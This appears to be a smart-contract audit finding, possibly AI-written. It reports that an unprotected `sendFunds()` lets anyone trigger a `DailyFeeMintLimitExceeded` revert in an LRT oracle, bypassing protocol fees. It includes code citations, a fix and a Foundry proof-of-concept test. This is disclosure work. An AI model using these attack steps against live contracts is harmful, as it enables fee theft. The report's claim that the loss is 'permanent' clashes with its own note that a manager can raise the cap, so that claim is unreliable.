Looking at the key contracts to trace the full exploit path.

### Title
Unpermissioned `sendFunds()` Enables Fee Bypass via `DailyFeeMintLimitExceeded` DoS — (`contracts/FeeReceiver.sol`)

---

### Summary

`FeeReceiver.sendFunds()` has no access control. Any attacker can call it when the contract holds accumulated ETH exceeding the daily fee mint cap, causing every subsequent `LRTOracle.updateRSETHPrice()` call to revert with `DailyFeeMintLimitExceeded`. The ETH is already in `LRTDepositPool` (TVL permanently increased), but `rsETHPrice` is never updated and no protocol fee is ever minted for those rewards — a permanent fee bypass.

---

### Finding Description

**Step 1 — Unpermissioned entrypoint**

`FeeReceiver.sendFunds()` carries no role modifier:

```solidity
// contracts/FeeReceiver.sol:53-58
function sendFunds() external {
    uint256 balance = address(this).balance;
    ILRTDepositPool(depositPool).receiveFromRewardReceiver{ value: balance }();
    emit MevRewardsAddedToTVL(balance);
}
``` [1](#0-0) 

`receiveFromRewardReceiver()` is equally open:

```solidity
// contracts/LRTDepositPool.sol:61
function receiveFromRewardReceiver() external payable { }
``` [2](#0-1) 

**Step 2 — TVL increases atomically; price update is separate**

After `sendFunds()` executes, `address(LRTDepositPool).balance` grows immediately. `getETHDistributionData()` reads `address(this).balance` directly, so `_getTotalEthInProtocol()` now reflects the full accumulated balance. However, `rsETHPrice` is a stored variable that is only written at the very end of `_updateRsETHPrice()`:

```solidity
// contracts/LRTOracle.sol:313
rsETHPrice = newRsETHPrice;
``` [3](#0-2) 

**Step 3 — Fee check reverts before the price write**

Inside `_updateRsETHPrice()`, the fee is computed from the full TVL delta since the last successful price update, then checked against the daily cap:

```solidity
// contracts/LRTOracle.sol:244-246
if (!protocolPaused && totalETHInProtocol > previousTVL) {
    uint256 rewardAmount = totalETHInProtocol - previousTVL;
    protocolFeeInETH = (rewardAmount * lrtConfig.protocolFeeInBPS()) / 10_000;
}
``` [4](#0-3) 

```solidity
// contracts/LRTOracle.sol:301-303
uint256 rsethAmountToMintAsProtocolFee = protocolFeeInETH.divWad(newRsETHPrice);
_checkAndUpdateDailyFeeMintLimit(rsethAmountToMintAsProtocolFee);
``` [5](#0-4) 

```solidity
// contracts/LRTOracle.sol:205-207
if (currentPeriodMintedFeeAmount + feeAmount > maxFeeMintAmountPerDay) {
    revert DailyFeeMintLimitExceeded(currentPeriodMintedFeeAmount + feeAmount, maxFeeMintAmountPerDay);
}
``` [6](#0-5) 

If the revert fires, execution never reaches line 313, so `rsETHPrice` remains stale.

**Step 4 — The DoS is self-perpetuating**

Because `rsETHPrice` is never updated, `previousTVL = rsethSupply * rsETHPrice` stays at the pre-dump value on every future call. The full accumulated reward delta is re-computed on every subsequent `updateRSETHPrice()` attempt, so the fee amount continues to exceed `maxFeeMintAmountPerDay` every day until the manager manually raises the cap. The protocol fee for those rewards is permanently unrecoverable.

Note: `updateRSETHPriceAsManager()` also calls `_updateRsETHPrice()` and hits the same revert path — there is no privileged bypass. [7](#0-6) 

---

### Impact Explanation

The protocol fee on the dumped rewards is never minted. The ETH is already in `LRTDepositPool`, so rsETH holders receive the full yield appreciation without the protocol's cut being deducted. This directly matches **High — Theft of unclaimed yield**: the protocol's share of staking/MEV rewards is permanently lost to the treasury.

---

### Likelihood Explanation

- `sendFunds()` requires zero privileges and zero capital from the attacker.
- `FeeReceiver` accumulates ETH passively from MEV/execution-layer rewards; the longer the protocol waits between `sendFunds()` calls, the larger the balance.
- `maxFeeMintAmountPerDay` is intentionally conservative (it exists to rate-limit fee minting). Any multi-day accumulation in `FeeReceiver` can exceed it.
- The attacker only needs to monitor the `FeeReceiver` balance and call one function at the right moment.

---

### Recommendation

Add an access-control modifier to `sendFunds()` (e.g., `onlyRole(LRTConstants.MANAGER)`) so only authorized callers can trigger the ETH transfer:

```solidity
function sendFunds() external onlyRole(LRTConstants.MANAGER) {
    ...
}
```

Additionally, consider splitting large accumulated rewards across multiple `updateRSETHPrice()` calls, or capping the single-call TVL delta that is eligible for fee computation, so the daily limit can never be permanently breached by a single dump.

---

### Proof of Concept

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.27;

// Foundry fork test (local fork, no mainnet calls)
import "forge-std/Test.sol";

contract FeeBypassPoC is Test {
    IFeeReceiver feeReceiver = IFeeReceiver(FEE_RECEIVER_ADDR);
    ILRTOracle   oracle      = ILRTOracle(ORACLE_ADDR);

    function test_feeBypassViaSendFunds() public {
        // 1. Simulate N days of MEV rewards accumulating in FeeReceiver
        uint256 accumulatedRewards = 100 ether; // >> maxFeeMintAmountPerDay equivalent
        vm.deal(address(feeReceiver), accumulatedRewards);

        uint256 priceBefore = oracle.rsETHPrice();

        // 2. Unprivileged attacker dumps all ETH into DepositPool
        vm.prank(address(0xdead));
        feeReceiver.sendFunds();

        // 3. TVL has increased — oracle update now reverts
        vm.expectRevert(); // DailyFeeMintLimitExceeded
        oracle.updateRSETHPrice();

        // 4. Price is still stale; no fee was minted
        assertEq(oracle.rsETHPrice(), priceBefore, "price must be stale");

        // 5. Same revert the next day (period resets but delta is unchanged)
        vm.warp(block.timestamp + 1 days + 1);
        vm.expectRevert();
        oracle.updateRSETHPrice();
    }
}
```

### Citations

**File:** contracts/FeeReceiver.sol (L53-58)
```text
    function sendFunds() external {
        uint256 balance = address(this).balance;
        ILRTDepositPool(depositPool).receiveFromRewardReceiver{ value: balance }();

        emit MevRewardsAddedToTVL(balance);
    }
```

**File:** contracts/LRTDepositPool.sol (L61-61)
```text
    function receiveFromRewardReceiver() external payable { }
```

**File:** contracts/LRTOracle.sol (L94-96)
```text
    function updateRSETHPriceAsManager() external onlyLRTManager {
        _updateRsETHPrice();
    }
```

**File:** contracts/LRTOracle.sol (L205-207)
```text
        if (currentPeriodMintedFeeAmount + feeAmount > maxFeeMintAmountPerDay) {
            revert DailyFeeMintLimitExceeded(currentPeriodMintedFeeAmount + feeAmount, maxFeeMintAmountPerDay);
        }
```

**File:** contracts/LRTOracle.sol (L244-246)
```text
        if (!protocolPaused && totalETHInProtocol > previousTVL) {
            uint256 rewardAmount = totalETHInProtocol - previousTVL;
            protocolFeeInETH = (rewardAmount * lrtConfig.protocolFeeInBPS()) / 10_000;
```

**File:** contracts/LRTOracle.sol (L301-303)
```text
            uint256 rsethAmountToMintAsProtocolFee = protocolFeeInETH.divWad(newRsETHPrice);

            _checkAndUpdateDailyFeeMintLimit(rsethAmountToMintAsProtocolFee);
```

**File:** contracts/LRTOracle.sol (L313-313)
```text
        rsETHPrice = newRsETHPrice;
```
